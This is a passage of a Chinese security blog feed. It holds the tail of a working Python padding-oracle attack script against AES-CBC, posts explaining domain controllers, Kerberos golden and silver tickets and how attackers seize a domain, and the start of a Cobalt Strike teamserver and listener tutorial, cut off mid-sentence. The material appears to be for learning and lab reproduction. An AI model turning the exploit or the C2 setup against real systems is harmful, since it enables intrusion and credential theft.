class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><br><span class="hljs-keyword">import</span> pdb<br><br><span class="hljs-keyword">from</span> poa <span class="hljs-keyword">import</span> test, POA<br><br><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES<br><span class="hljs-keyword">import</span> IPython<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">PaddingOracleAttack</span>(<span class="hljs-title class_ inherited__">object</span>):<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, cipher, iv</span>):<br>        self.cipher = cipher<br><br>        <span class="hljs-comment"># 把密文分割成列表，每个列表元素16字节</span><br>        self.cipher_lst = self.split_block(self.cipher)<br><br>        <span class="hljs-comment"># 解密的中间值</span><br>        self.mid_lst = [self.brute_middle(self.cipher_lst[-<span class="hljs-number">1</span>])]<br><br>        <span class="hljs-comment"># 存储计算出来的明文</span><br>        self.plain_lst = [[] <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> self.cipher_lst]<br><br><span class="hljs-meta">    @classmethod</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">split_block</span>(<span class="hljs-params">cls, cipher</span>):<br>        cipher_list = []<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(cipher), <span class="hljs-number">16</span>):<br>            cipher_list.append(cipher[i: i + <span class="hljs-number">16</span>])<br>        <span class="hljs-keyword">return</span> cipher_list<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">calc_new_tail</span>(<span class="hljs-params">self, tail, idx</span>):<br>        new_tail = <span class="hljs-string">b&quot;&quot;</span><br>        <span class="hljs-keyword">for</span> t <span class="hljs-keyword">in</span> tail:<br>            _tail = t ^ (idx - <span class="hljs-number">1</span>) ^ idx<br>            new_tail += _tail.to_bytes(<span class="hljs-number">1</span>, byteorder=<span class="hljs-string">&quot;big&quot;</span>)<br>        <span class="hljs-keyword">return</span> new_tail<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">brute_middle</span>(<span class="hljs-params">self, cipher_line</span>):<br>        <span class="hljs-string">&#x27;&#x27;&#x27;暴力破解解密的中间值&#x27;&#x27;&#x27;</span><br>        tail = <span class="hljs-string">b&quot;&quot;</span><br>        mid_lst = []<br>        <span class="hljs-comment"># 从pad 为0x01开始 到 0x10</span><br>        <span class="hljs-keyword">for</span> pad <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">17</span>):<br><br>            <span class="hljs-comment"># 计算新的pad尾部，因为每计算出来一个pad，再往前计算新的pad的时候，尾部的每一个值异或出来都要放大1位。</span><br>            tail = self.calc_new_tail(tail, pad)<br><br>            find_pad = <span class="hljs-literal">False</span><br>            <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-number">256</span>):<br>                <span class="hljs-comment"># 形成2个密文块</span><br>                cipher = <span class="hljs-string">b&quot;\x00&quot;</span> * (<span class="hljs-number">16</span> - pad) + i.to_bytes(<span class="hljs-number">1</span>, byteorder=<span class="hljs-string">&quot;big&quot;</span>) + tail + cipher_line<br>                <span class="hljs-keyword">if</span> POA.decrypt_without_result(cipher):<br>                    <span class="hljs-comment"># print(&quot;[!] Cipher - %s&quot; % cipher)</span><br>                    find_pad = <span class="hljs-literal">True</span><br>                    tail = i.to_bytes(<span class="hljs-number">1</span>, byteorder=<span class="hljs-string">&quot;big&quot;</span>) + tail<br><br>                    mid_chr = i ^ pad<br>                    mid_lst.insert(<span class="hljs-number">0</span>, mid_chr)<br><br>            <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> find_pad:<br>                <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&quot;Error not find pad!&quot;</span>)<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">bytes</span>(mid_lst)<br><br><span class="hljs-meta">    @classmethod</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__pad</span>(<span class="hljs-params">cls, text: <span class="hljs-built_in">bytes</span></span>):<br>        <span class="hljs-string">&quot;&quot;&quot;PKCS7 padding&quot;&quot;&quot;</span><br>        text_length = <span class="hljs-built_in">len</span>(text)<br>        amount_to_pad = AES.block_size - (text_length % AES.block_size)<br>        <span class="hljs-keyword">if</span> amount_to_pad == <span class="hljs-number">0</span>:<br>            amount_to_pad = AES.block_size<br>        pad = <span class="hljs-built_in">chr</span>(amount_to_pad).encode()<br>        <span class="hljs-keyword">return</span> text + pad * amount_to_pad<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">fake</span>(<span class="hljs-params">self, plain, cipher=<span class="hljs-literal">None</span>, mid=<span class="hljs-literal">None</span></span>):<br>        <span class="hljs-string">&#x27;&#x27;&#x27;伪造</span><br><span class="hljs-string"></span><br><span class="hljs-string">        :plain: 要伪造的明文</span><br><span class="hljs-string">        :last_cipher: 一个密文块</span><br><span class="hljs-string">        :last_mid:  密文块解密出来的中间值</span><br><span class="hljs-string">        &#x27;&#x27;&#x27;</span><br>        pad_plain = self.__pad(plain)<br>        plain_lst = self.split_block(pad_plain)<br>        mid = mid <span class="hljs-keyword">if</span> mid <span class="hljs-keyword">else</span> self.mid_lst[-<span class="hljs-number">1</span>]<br><br>        cipher = [cipher <span class="hljs-keyword">if</span> cipher <span class="hljs-keyword">else</span> self.cipher_lst[-<span class="hljs-number">1</span>]]<br><br>        <span class="hljs-comment"># 从最后开始计算</span><br>        <span class="hljs-keyword">for</span> plain <span class="hljs-keyword">in</span> plain_lst[::-<span class="hljs-number">1</span>]:<br>            need_iv = <span class="hljs-string">b&quot;&quot;</span><br>            <span class="hljs-keyword">for</span> idx <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(plain)):<br>                _m = mid[idx]<br>                _p = plain[idx]<br>                need_iv += (_m ^ _p).to_bytes(<span class="hljs-number">1</span>, byteorder=<span class="hljs-string">&quot;big&quot;</span>)<br><br>            mid = self.brute_middle(need_iv)<br>            cipher.insert(<span class="hljs-number">0</span>, need_iv)<br><br>        <span class="hljs-keyword">return</span> cipher[<span class="hljs-number">0</span>], <span class="hljs-string">b&#x27;&#x27;</span>.join(cipher[<span class="hljs-number">1</span>:])<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">decrypt</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-string">&#x27;&#x27;&#x27;解密&#x27;&#x27;&#x27;</span><br>        <span class="hljs-comment"># 从最后开始计算</span><br>        self.mid_lst = []<br>        <span class="hljs-keyword">for</span> _idx <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(self.cipher_lst), <span class="hljs-number">0</span>, -<span class="hljs-number">1</span>):<br>            line_idx = _idx - <span class="hljs-number">1</span><br>            cipher_line = self.cipher_lst[line_idx]<br><br>            <span class="hljs-keyword">if</span> line_idx &gt;= <span class="hljs-number">1</span>:<br>                <span class="hljs-comment"># 获取上一行密文数据，因为每一行的明文加密之前需要与上一行的密文异或</span><br>                p_cipher_line = self.cipher_lst[line_idx - <span class="hljs-number">1</span>]<br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-comment"># 如果是第一行，则其与IV异或</span><br>                p_cipher_line = iv<br><br>            _mid = self.brute_middle(cipher_line)<br>            self.mid_lst.insert(<span class="hljs-number">0</span>, _mid)<br>            <span class="hljs-keyword">for</span> idx, _m <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(_mid):<br>                plain_chr = _m ^ p_cipher_line[idx]<br>                self.plain_lst[line_idx].append(plain_chr)<br><br>        plain = <span class="hljs-string">b&quot;&quot;</span><br>        <span class="hljs-keyword">for</span> p <span class="hljs-keyword">in</span> self.plain_lst:<br>            plain += <span class="hljs-built_in">bytes</span>(p)<br><br>        <span class="hljs-keyword">return</span> plain<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    cipher = test()     <span class="hljs-comment"># 获取密文</span><br>    iv = POA.IV         <span class="hljs-comment"># 获取初始化向量</span><br><br>    poa_atck = PaddingOracleAttack(cipher, iv)<br>    new_iv, new_cipher = poa_atck.fake(<span class="hljs-string">b&quot;wo ai beijing tianan men!&quot;</span>)<br>    plain = poa_atck.decrypt()<br><br>    IPython.embed()<br></code></pre></td></tr></table></figure><h2 id="结语"><a href="#结语" class="headerlink" title="结语"></a><strong>结语</strong></h2><p>经典通过错误响应的反馈进行的攻击</p><p>参考：</p><ul><li><a href="https://blog.gdssecurity.com/labs/2010/9/14/automated-padding-oracle-attacks-with-padbuster.html">https://blog.gdssecurity.com/labs/2010/9/14/automated-padding-oracle-attacks-with-padbuster.html</a></li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>CVE复现</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>域、域控</title>
    <link href="/2025/02/19/%E5%9F%9F%E3%80%81%E5%9F%9F%E6%8E%A7/"/>
    <url>/2025/02/19/%E5%9F%9F%E3%80%81%E5%9F%9F%E6%8E%A7/</url>
    
    <content type="html"><![CDATA[<h1 id="域、域控"><a href="#域、域控" class="headerlink" title="域、域控"></a>域、域控</h1><h2 id="一、什么是域，域控"><a href="#一、什么是域，域控" class="headerlink" title="一、什么是域，域控"></a>一、什么是域，域控</h2><ul><li><p>**域(Domain)**：将网络中的多台计算机通过逻辑的方式组织到一起，进行集中管理，这种集中管理的环境称为域。</p></li><li><p><strong>域控</strong>：就是域控制器（Domain Controller，DC)其中每个域中至少有一台域控制器、集中存放整个域的用户账号和安全<a href="https://cloud.tencent.com/product/tencentdb-catalog?from_column=20065&from=20065">数据库</a>，安装了活动目录(AD)的主机称为域控制器。</p></li></ul><p>举个最常见的例子：学校的机房中的所有的电脑设备就是一个域，而老师就是通过域控来直接实现教室里所有的电脑的开关机以及软件的的安装这些常规操作；部分规模较大的网吧也是这样</p><ul><li>**活动目录（Active Directory，AD)**：活动目录是一个目录数据库，存储整个windows网络中对象的相关信息（可以理解为存储了网络中所有资源的快捷方式）。也是一种服务，可对活动目录中数据执行各种操作。</li><li><strong>父域和子域</strong>：出于管理需求，需要在网络中划分多个域。第一个域称为父域，各分部的域称为子域。不同的域之间，信息交互的条目会大大减少，且可以压缩后进行交互，节约带宽。并且域管可以针对各个域，设置不同的安全策略，灵活管理。</li><li>**域树 (Tree)**：域管只能管理本域，如果需要管理其他域，则需要建立信任关系，域树则是指多个域通过建立信任关系组成的集合。同理，多个域树通过建立信任关系组成的集合则称为域林。</li><li>**域名服务器 (DNS)**：用于实现域名和与之对应的IP地址之间相互转换。因为域中的计算机是使用DNS来定位域控和其他服务器的，所以域的名字就是DNS域的名字。（DNS和DC一般在同一台机器上）</li></ul><p><u>注意：大部分在同一个域下的设备是在同一个局域网中的但是在不同局域网中的设备也可以在同一个域中，因为<strong>只要能够指向正确的dns服务器便可以找到域控</strong></u>域控服务器要在公网上</p><h2 id="二、为什么要有域控，域控能够干啥"><a href="#二、为什么要有域控，域控能够干啥" class="headerlink" title="二、为什么要有域控，域控能够干啥"></a>二、为什么要有域控，域控能够干啥</h2><h3 id="集中管理用户和计算机："><a href="#集中管理用户和计算机：" class="headerlink" title="集中管理用户和计算机："></a><strong>集中管理用户和计算机</strong>：</h3><ul><li>身份验证：验证用户登录请求的有效性。</li><li>计算机管理：确保域内计算机的身份有效，按照预定策略进行配置和管理。</li></ul><h3 id="资源共享与访问控制："><a href="#资源共享与访问控制：" class="headerlink" title="资源共享与访问控制："></a><strong>资源共享与访问控制</strong>：</h3><ul><li>共享资源管理：通过 Active Directory 管理共享资源，如打印机、文件服务器。</li><li>权限控制：精细化设置访问权限，确保用户只能访问授权的资源。</li></ul><h3 id="组策略（GPO）管理："><a href="#组策略（GPO）管理：" class="headerlink" title="组策略（GPO）管理："></a><strong>组策略（GPO）管理</strong>：</h3><ul><li>集中配置管理：统一配置计算机和用户的设置，保证一致性。</li><li>自动化管理：批量配置和管理网络中所有计算机。</li></ul><h3 id="身份验证与单点登录（SSO）："><a href="#身份验证与单点登录（SSO）：" class="headerlink" title="身份验证与单点登录（SSO）："></a><strong>身份验证与单点登录（SSO）</strong>：</h3><ul><li>单点登录：用户一次登录即可访问所有资源。</li><li>Kerberos 身份验证：确保身份验证的安全性，防止中间人攻击。</li></ul><h3 id="集中管理的安全性："><a href="#集中管理的安全性：" class="headerlink" title="集中管理的安全性："></a><strong>集中管理的安全性</strong>：</h3><ul><li>审计与监控：记录用户和计算机的活动，进行安全监控。</li><li>强制安全策略：执行密码复杂度要求、定期更换密码、锁定账户等安全策略。</li></ul><h3 id="跨地域、跨网络的管理："><a href="#跨地域、跨网络的管理：" class="headerlink" title="跨地域、跨网络的管理："></a><strong>跨地域、跨网络的管理</strong>：</h3><ul><li>跨地域管理：多个域控制器同步工作，确保分支机构的一致性。</li><li>远程访问：支持 VPN 或其他方式的远程安全登录。</li></ul><h3 id="组织和群组管理："><a href="#组织和群组管理：" class="headerlink" title="组织和群组管理："></a><strong>组织和群组管理</strong>：</h3><ul><li>组织单位（OU）：根据部门或职能划分用户和计算机，实施组策略。</li><li>群组管理：将用户归类为不同组，并为组分配权限。</li></ul><h3 id="域内计算机的自动化管理："><a href="#域内计算机的自动化管理：" class="headerlink" title="域内计算机的自动化管理："></a><strong>域内计算机的自动化管理</strong>：</h3><ul><li>计算机加入域：新计算机自动继承域控制器的配置和权限。</li><li>远程管理：远程进行计算机管理，如故障诊断、更新等。</li></ul><h3 id="灾难恢复与备份："><a href="#灾难恢复与备份：" class="headerlink" title="灾难恢复与备份："></a><strong>灾难恢复与备份</strong>：</h3><ul><li>备份与恢复：定期备份 Active Directory 数据库，灾难恢复时还原用户、计算机账户及策略。</li><li>容错机制：多个备用域控制器保证高可用性。</li></ul><h3 id="其他功能："><a href="#其他功能：" class="headerlink" title="其他功能："></a><strong>其他功能</strong>：</h3><ul><li>DNS 服务：充当 DNS 服务器，解析域内计算机的域名。</li><li>时间同步：确保所有域内计算机时间同步，确保身份验证和日志管理的准确性。</li></ul><h2 id="三、啥叫拿到域控"><a href="#三、啥叫拿到域控" class="headerlink" title="三、啥叫拿到域控"></a>三、啥叫拿到域控</h2><p>拿到域控” 这个表达通常是指攻击者成功获取了 <strong>域控制器</strong>（Domain Controller, <strong>DC</strong>）的 <strong>控制权限</strong>，意味着攻击者已经获得了 <strong>Active Directory</strong> 的控制权，能够对整个网络中的计算机、用户、资源、权限等进行操作。</p><figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs mathematica">为什么<span class="hljs-string">&quot;拿到域控&quot;</span>这么重要？<br>完全控制网络： 域控是整个网络安全和管理的核心，控制了 <span class="hljs-built_in">Active</span> <span class="hljs-built_in">Directory</span>。<span class="hljs-built_in">Active</span> <span class="hljs-built_in">Directory</span> 中存储着网络中所有用户、计算机、组、权限等信息。攻击者一旦控制了域控，就相当于可以在网络中执行几乎任何操作，例如：<br><br>创建、修改、删除用户和组账户。<br>修改用户的权限，可能包括将管理员权限授予自己。<br>控制网络中的计算机，甚至强制其加入到攻击者的控制下。<br>修改安全策略、访问控制列表（<span class="hljs-variable">ACLs</span>）、组策略等，进而影响整个域内的安全性。<br>获取管理员权限： 域控的 管理员账户（特别是 域管理员账户）具有对网络所有计算机的完全控制权限。攻击者一旦获得 域管理员 或 <span class="hljs-variable">Enterprise</span> <span class="hljs-variable">Admin</span> 权限，就能够对所有域成员计算机和服务器进行任意操作，包括：<br>安装恶意软件或后门。<br>获取所有用户的密码哈希值。<br>进一步提升权限，控制整个组织的 <span class="hljs-variable">IT</span> 环境。<br>攻击持久性： 一旦控制了域控，攻击者可以长期在网络内保持隐蔽访问：<br>通过创建新的管理员账户或修改现有账户，确保自己在系统中保持活动。<br>攻击者可以利用域控维护后门，即使其他安全措施被加强，依然能持续保持对网络的访问。<br>盗取凭证： 域控上存储着大量的用户和计算机的 凭证（用户名和密码哈希）。攻击者通过拿到域控，可以通过 <span class="hljs-variable">hashdump</span> 等工具提取出这些凭证，从而尝试进行 横向移动攻击，即从一个受控系统跳跃到其他计算机，获取更多的访问权限。<br>执行横向渗透和数据窃取：<br>拿到域控后，攻击者可以通过 <span class="hljs-variable">Kerberos</span> 或其他协议，利用已经获取的票据或凭证，执行横向渗透攻击，进而侵入更多的目标系统。<br>还可以窃取机密数据，获取公司的敏感信息，如财务数据、客户信息等。<br><br><br>常见的“拿到域控”方式<br>利用漏洞攻击： 攻击者通过利用操作系统或 <span class="hljs-built_in">Active</span> <span class="hljs-built_in">Directory</span> 中的漏洞（例如 <span class="hljs-variable">MS17</span><span class="hljs-operator">-</span><span class="hljs-number">010</span>，即 <span class="hljs-variable">EternalBlue</span> 漏洞）来渗透目标网络，并最终获取域控权限。<br>凭证攻击：<br>通过 钓鱼 或 暴力破解 获取域管理员的凭证。<br>使用 <span class="hljs-variable">Pass</span><span class="hljs-operator">-</span><span class="hljs-variable">the</span><span class="hljs-operator">-</span><span class="hljs-built_in">Hash</span> 或 <span class="hljs-variable">Pass</span><span class="hljs-operator">-</span><span class="hljs-variable">the</span><span class="hljs-operator">-</span><span class="hljs-variable">Ticket</span> 技术直接利用窃取的哈希值或票据访问域控。<br>社会工程学攻击： 通过社会工程学手段骗取管理员的密码，或者诱导用户执行恶意代码，从而获得访问权限。<br>滥用现有权限： 如果攻击者已经在某台计算机上拥有 高权限（如本地管理员权限），他们可以通过 提权 来获得域控的访问权限。常见的方法有 <span class="hljs-variable">UAC</span> 绕过、利用漏洞 等。<br>物理接触： 在某些极端情况下，攻击者可能通过物理接触域控服务器来获取控制权，例如直接操作服务器或者通过接入服务器的管理接口（如 <span class="hljs-variable">iLO</span>、<span class="hljs-variable">DRAC</span> 等远程管理工具）来控制服务器。<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>内网渗透</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>票据及其相关的工作原理</title>
    <link href="/2025/02/19/%E7%A5%A8%E6%8D%AE%E5%8F%8A%E7%9B%B8%E5%85%B3%E5%8E%9F%E7%90%86/"/>
    <url>/2025/02/19/%E7%A5%A8%E6%8D%AE%E5%8F%8A%E7%9B%B8%E5%85%B3%E5%8E%9F%E7%90%86/</url>
    
    <content type="html"><![CDATA[<h1 id="票据及其相关的工作原理"><a href="#票据及其相关的工作原理" class="headerlink" title="票据及其相关的工作原理"></a>票据及其相关的工作原理</h1><h2 id="一、Kerberos"><a href="#一、Kerberos" class="headerlink" title="一、Kerberos"></a>一、Kerberos</h2><h3 id="1-啥是Kerberos"><a href="#1-啥是Kerberos" class="headerlink" title="1 啥是Kerberos"></a>1 啥是Kerberos</h3><p>Kerberos是一种网络认证协议，尤其适用于内网中的分布式系统，通过中央认证服务器来管理用户和服务身份的验证，</p><p>在内网中所实现的主要功能：</p><p>1.内网用户认证：确保只有通过认证的用户才能够访问内网中的资源</p><p>2.单点登录SSO：用户只需要登录一次便可以去访问内网中的所有支持Kerberos的服务 </p><p>3.安全的服务访问：它利用 <strong>服务票据</strong> 来确保用户和服务之间的通信是安全的，防止未授权的访问。</p><p>4.防止密码泄露：Kerberos 避免了在网络上传输用户的明文密码，所有认证过程都通过加密的票据进行，增强了内网的安全性。</p><h3 id="2-Kerberos工作原理"><a href="#2-Kerberos工作原理" class="headerlink" title="2 Kerberos工作原理"></a>2 Kerberos工作原理</h3><p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202411132059856.png" alt="屏幕截图 2024-11-13 204304"></p><ol><li><strong>身份验证请求（AS-REQ 和 AS-REP）</strong>：<ul><li>客户端（例如用户的计算机）向 <strong>认证服务（AS）</strong> 发送请求，要求获得一个票据授权票（TGT，Ticket Granting Ticket）。请求中通常包括客户端的用户名。</li><li>如果认证服务确认用户身份（通常通过用户名和密码验证），它会返回一个加密的 TGT 以及一个 <strong>会话密钥</strong>（用于客户端与授权服务之间的通信加密）。TGT 是由认证服务签发的，它可以用于获取访问其他服务的权限。</li></ul></li><li><strong>票据授权请求（TGS-REQ 和 TGS-REP）</strong>：<ul><li>客户端使用已获得的 TGT 向 <strong>票据授权服务（TGS）</strong> 发送请求，请求访问某个具体的服务（例如文件服务器、数据库等）。</li><li>TGS 验证 TGT 的有效性，并根据请求的服务生成一个新的票据（服务票据），该票据加密了客户端的身份信息和会话密钥。TGS-REP 消息包含服务票据，客户端可以使用该票据访问目标服务。</li></ul></li><li><strong>访问请求（AP-REQ 和 AP-REP）</strong>：<ul><li>客户端将服务票据发送给目标服务进行访问验证。</li><li>目标服务（例如应用服务器）解密票据，验证用户身份并生成响应。成功后，客户端和服务之间可以开始加密通信。</li></ul></li></ol><h3 id="黄金票据详解："><a href="#黄金票据详解：" class="headerlink" title="黄金票据详解："></a>黄金票据详解：</h3><p><strong><a href="https://www.cnblogs.com/backlion/p/8127868.html">https://www.cnblogs.com/backlion/p/8127868.html</a></strong></p><h3 id="3-银票据黄金票据钻石票据概述以及它们之间的关系"><a href="#3-银票据黄金票据钻石票据概述以及它们之间的关系" class="headerlink" title="3 银票据黄金票据钻石票据概述以及它们之间的关系"></a>3 银票据黄金票据钻石票据概述以及它们之间的关系</h3><p>银票据只能通过伪造一个服务票据（TGS）去访问<strong>某个特定的服务</strong></p><p>黄金票据是通过去伪造一个 Kerberos票据授权票（TGT） 该票据可以为攻击者提供对<strong>这个域中中几乎所有资源的访问权限</strong></p><p>钻石票据攻击者伪造并利用*<em>多个域控制器上的 Kerberos 票据，以实现对*<em>跨域环境的权限提升和横向攻击</em></em></p><h4 id="黄金票据（Golden-Ticket）工作原理："><a href="#黄金票据（Golden-Ticket）工作原理：" class="headerlink" title="黄金票据（Golden Ticket）工作原理："></a>黄金票据（Golden Ticket）工作原理：</h4><ol><li><strong>获取 KRBTGT 密钥</strong>：攻击者首先需要在域控制器上获取 KRBTGT 账户的 NTLM 哈希。KRBTGT 是 Kerberos 的服务账户，负责签名和加密所有的 Kerberos 票据。</li><li><strong>伪造票据</strong>：通过获得 KRBTGT 密钥，攻击者可以伪造一个 Kerberos 服务票据（TGT），该票据可以为攻击者提供对网络中几乎所有资源的访问权限。</li><li><strong>访问权限</strong>：一旦拥有黄金票据，攻击者可以在网络中伪装成任何用户，甚至是域管理员，获取完全控制权，进行各种恶意活动。</li></ol>]]></content>
    
    
    
    <tags>
      
      <tag>内网渗透</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CobaltStrike的使用</title>
    <link href="/2024/11/16/CobaltStrike%E7%9A%84%E4%BD%BF%E7%94%A8/"/>
    <url>/2024/11/16/CobaltStrike%E7%9A%84%E4%BD%BF%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<h1 id="在局域网中迅速起一个web服务小技巧"><a href="#在局域网中迅速起一个web服务小技巧" class="headerlink" title="在局域网中迅速起一个web服务小技巧"></a>在局域网中迅速起一个web服务小技巧</h1><p>迅速在局域网中使用python迅速起一个web服务可以用来快速的下载一个文件</p><p>命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python -m http.server<br></code></pre></td></tr></table></figure><p>这个命令启用后可以访问到当前运行命令所在目录及其子目录中的文件 然后直接下载 比较方便</p><p>拿到shell第一步首先想到的是权限维持</p><h1 id="一、CobaltStrike的使用"><a href="#一、CobaltStrike的使用" class="headerlink" title="一、CobaltStrike的使用"></a>一、CobaltStrike的使用</h1><h2 id="启动服务器："><a href="#启动服务器：" class="headerlink" title="启动服务器："></a>启动服务器：</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh">./teamserver 192.168.0.204[服务端ip] 123@asd  [客户端连接服务短所需要的连接密码] <br>nohub ./teamserver 192.168.0.204[服务端ip] 123@asd  [后台运行进程]<br></code></pre></td></tr></table></figure><p>启动默认端口是50050如果需要更改可以改服务端文件中的teamserver文件中的内容如图：</p><p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202411191524924.png" alt="image-20241119152414674"></p><p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202411191524048.png" alt="image-20241119152417881"></p><h2 id="cs控制端-C2服务器-目标攻击主机之间的关系"><a href="#cs控制端-C2服务器-目标攻击主机之间的关系" class="headerlink" title="cs控制端-C2服务器-目标攻击主机之间的关系"></a>cs控制端-C2服务器-目标攻击主机之间的关系</h2><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs gcode">攻击者操作端（CS GUI）  <br>    ↕ <span class="hljs-comment">(命令管理与控制)</span><br>Cobalt Strike Team Server（C<span class="hljs-number">2</span> 服务器）  <br>    ↕ <span class="hljs-comment">(通信伪装: HTTP/HTTPS/DNS/SMB)</span><br>目标主机（被感染设备）  <br></code></pre></td></tr></table></figure><h1 id="二、CS创建攻击Attacks"><a href="#二、CS创建攻击Attacks" class="headerlink" title="二、CS创建攻击Attacks"></a>二、CS创建攻击Attacks</h1><h2 id="CS创建监听器"><a href="#CS创建监听器" class="headerlink" title="CS创建监听器"></a>CS创建监听器</h2><p>CobaltStrike的内置监听器叫Beacon，外置监听器叫Foreign。cs的Beacon支持异步通信和交互式通信。</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs">1.异步通信是一种非实时通信方式，发送方和接收方的交互时间没有严格同步的要求。发送方发送消息后，不需要等待接收方的即时响应，接收方可以在稍后的时间处理消息。<br>2.交互式通信是一种实时通信方式，发送方和接收方在同一时间范围内进行通信。发送方发送消息后，通常需要立即收到接收方的响应，才能继续下一步操作。<br></code></pre></td></tr></table></figure><p>创建监听器的步骤： </p><p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202411191742086.png" alt="屏幕截图 2024-11-19 173946"></p><p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202411191742740.png" alt="屏幕截图 2024-11-19 174012"></p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs scss">在上图中：<br>name：为监听器的名字<br>payload：为payload的类型<br>HTTP Hosts：shell反弹的主机，也就是我们kali的ip<br>HTTP <span class="hljs-built_in">Hosts</span>(Stager)：Stager的马请求下载payload的地址<br>HTTP <span class="hljs-built_in">Port</span>(C2)：C2监听的端口<br></code></pre></td></tr></table></figure><h3 id="Beacon的基本工作原理"><a href="#Beacon的基本工作原理" class="headerlink" title="Beacon的基本工作原理"></a>Beacon的基本工作原理</h3><p><strong>Beacon</strong> 它是一个 <strong>长期存在的</strong> 